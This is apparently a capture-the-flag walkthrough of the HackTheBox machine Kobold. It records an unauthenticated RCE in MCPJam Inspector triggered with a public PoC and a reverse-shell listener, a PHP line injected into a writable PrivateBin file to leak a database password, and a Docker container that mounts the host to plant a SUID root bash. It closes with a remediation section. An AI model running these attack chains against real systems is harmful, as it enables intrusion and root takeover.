Kobold

HackTheBox Easy red team | Linux · web · Docker | 21 Oct 2026
tl;dr

Kobold's showpiece is Arcane, a Docker management dashboard on port 3552, but it is locked behind a login we don't have. The real way in is an unauthenticated RCE in an MCPJam Inspector instance hiding on an HTTPS virtual host we almost walked past, landing a shell as ben. From there, ben can write to the PHP source of the PrivateBin container's data directory, so poisoning one file makes the app leak its own config and hand us a database password. That password logs into Arcane, and since Arcane drives Docker as root, we spin up a container that mounts the host filesystem and drop a SUID root bash to own the box.

Full port and service scan first:

the gate we have to beat first Almost every Arcane advisory assumes we are already authenticated. The default credentials (arcane / arcane-admin) are rejected, so they were changed on first login. Our first job isn't an exploit - it's getting a credential, which means the way in is somewhere else on the box.

02Mapping the Arcane API

With no obvious login, we study the API. Capturing a login attempt in Burp shows us exactly how the endpoint expects to be called, which doubles as a template for a credential-spray tool:

For completeness we brute-force the API surface with feroxbuster against /api:

$ feroxbuster -u http://10.129.245.50:3552/api -w .../api/api-endpoints.txt -t 50 -C 404,403

A spray against admin@kobold.htb with rockyou gets us nothing, and none of the credentialless advisories apply. We are stuck on authentication - which usually means we are enumerating the wrong surface.

03The virtual host we almost missed

The nmap cert told us about *.kobold.htb, so there should be virtual hosts to find. Our first gobuster vhost run over HTTP came back with nothing but error 400s:

The miss here is on us: the service that actually carries the certificate is on 443, not 80, and the whole site redirects to HTTPS. Re-running the scan against https:// with -k (skip cert validation) immediately changes the picture:

$ gobuster vhost -u https://kobold.htb -k --append-domain -w .../subdomains-top1million-110000.txt -t 50
valuable reminder: enumerate on the port that holds the cert We skipped over enumerating 443 and nearly wrote off vhosts entirely. When a host serves both 80 and 443 and the TLS certificate (here with a *.kobold.htb SAN) lives on 443, that is the port to point vhost discovery at - over https with -k. The certificate is a map of what the server expects to answer for.

Visiting each: bin.kobold.htb is PrivateBin 2.0.2 (a pastebin), and mcp.kobold.htb is MCPJam Inspector v1.4.2.

04Foothold - unauthenticated RCE in MCPJam

MCPJam Inspector v1.4.2 is the lead. It has a public exploit (exploit-db 52625, CVE-2026-23744): the /api/mcp/connect endpoint takes a command and args and spawns a process with no authentication (CWE-306, missing authentication for a critical function). Fixed in 1.4.3 - this build is vulnerable.

We set up the PoC, start a listener, and fire it to execute a reverse shell:

$ nc -lvnp 4444                  # listener on Kali
$ python3 ./mcpjam_rce.py -t http://mcp.kobold.htb -c '<reverse-shell>'
why this is the finding, and how bad it really is An endpoint whose entire job is "run this command" reachable with no credentials is as direct as RCE gets. Severity here is critical: it is pre-auth, network-reachable (the service binds 0.0.0.0), and lands code execution as the user running MCPJam. The only thing holding it back from "own the host outright" is that the shell comes back as an unprivileged user, not root.

The listener catches a shell as ben, and the user flag is in his home directory [flag omitted]. Foothold complete.

05Enumeration as ben

Standard first checks: whoami, id, groups, writable locations, and any low-hanging credentials. ben's home is empty - no .bash_history, no .ssh keys. Reading /etc/group and /etc/passwd turns up the detail that shapes the rest of the box:

Looking at running processes, Arcane and the Docker stack run as root:

reading the shape of the box Three things line up: the one app we cannot reach is Arcane; there's a user (alice) in the docker group; and Arcane controls Docker as root. The intended path is almost certainly "get into Arcane, then abuse its root-level control of Docker." So the next question is where a credential for Arcane might be hiding.

In /privatebin-data/data there are PrivateBin's .php files (purge_limiter.php, salt.php, traffic_limiter.php). Reading them shows nothing secret, but the important discovery is a permission one: ben can write to these files. If we can inject PHP into a file the app executes, we can make PrivateBin run code for us.

06Leaking the PrivateBin config

PrivateBin runs in a container, so before poisoning anything we map what the container can actually see. findmnt only shows our own (host) namespace, so we read the container's mounts out of /proc/*/mountinfo:

$ grep privatebin /proc/*/mountinfo 2>/dev/null | sort -u
the primitive, in one line We can write to /srv/data (as ben on the host, that's /privatebin-data/data), and the PHP app runs files from there with the container's view of the filesystem - which includes the read-only /srv/cfg we can't reach from the host. So: append PHP to a data file that copies /srv/cfg/conf.php back into /srv/data, where we can read it.

We keep a copy of the original purge_limiter.php first (so it can be restored), then append a line that lists /srv/cfg and writes its conf.php into a world-readable leak.txt:

$ printf '\nfile_put_contents("/srv/data/leak.txt", print_r(scandir("/srv/cfg"), true) . "\n== CONF ==\n" . @file_get_contents("/srv/cfg/conf.php"));\n' >> /privatebin-data/data/purge_limiter.php

The payload runs whenever PrivateBin executes that file, so we just submit any paste to bin.kobold.htb to trigger it, then read the result on the host:

$ cat /privatebin-data/data/leak.txt

The config carries three database blocks, but most are commented out (lines starting with ;). Only one is live:

read the comments, not just the keys Two blocks share the same username, but a leading ; disables a line in INI-style config. The live block even has a note about "migrating to a new server," which is exactly the kind of in-progress change that leaves a working password sitting in plaintext. We take the uncommented one first.

08Privilege escalation - container escape to root

Arcane runs as root and controls Docker, which means any container it launches runs as root and can be told to mount the host's filesystem. We borrow the image already on the box and create a new container with three deliberate settings: run as user 0, mount the host root at /host, and a command that drops a SUID root bash onto the host's /tmp.

Arcane also gives us an interactive shell straight into the container we just created, which confirms we are root with the host mounted:

From the container's root shell we can read anything through /host, including the root flag:

09Root cause & remediation

Unauthenticated RCE in MCPJam Inspector
v1.4.2 / CVE-2026-23744 / CWE-306		 Patch to 1.4.3+, require authentication on /api/mcp/connect, and never bind a dev/inspection tool to 0.0.0.0 on a reachable host. Tools that run commands by design must not be exposed.
User-writable application source The ben account could write to PHP the app executes. App code and data must be owned by a separate, locked-down account; the web/runtime user should never have write access to the scripts it runs.
Plaintext DB password in config, reused Keep secrets out of world-/user-readable config, use a secrets manager, and never reuse one service's password for another (here it unlocked Arcane). Rotate anything that touched a readable file.
Root-level Docker control from a web app A Docker-management UI with access to docker.sock is root-equivalent, so one app credential equals host compromise. Gate it behind strong auth/MFA, restrict who can create containers or mount host paths, and treat the Docker socket as a crown jewel.

10Takeaways

Kobold is rated Easy, but it plays closer to a Medium in my opinion - the chain is long and each link depends on reading the last one correctly: a hidden vhost, an unauth RCE, a filesystem-permission quirk, a PHP injection that leaks a config, a reused password, and finally a container escape. None of the steps are individually hard, but stringing six of them together with the right severity read at each stage is more than an Easy box usually asks.

The lesson I'm burning into my notes is the 443 one: I enumerated vhosts over HTTP, got nothing, and nearly concluded there were none. The certificate with its *.kobold.htb SAN lived on 443, and the whole site redirected to HTTPS - so vhost discovery had to run against https:// with -k. Point enumeration at the port that holds the cert, and let the certificate tell you what the server expects to answer for.

The other pattern worth keeping: when the app you can't reach runs as root and controls Docker, the whole box is really about finding one credential for it. A Docker-management dashboard with the socket is not "a web app" - it is root with a login page.
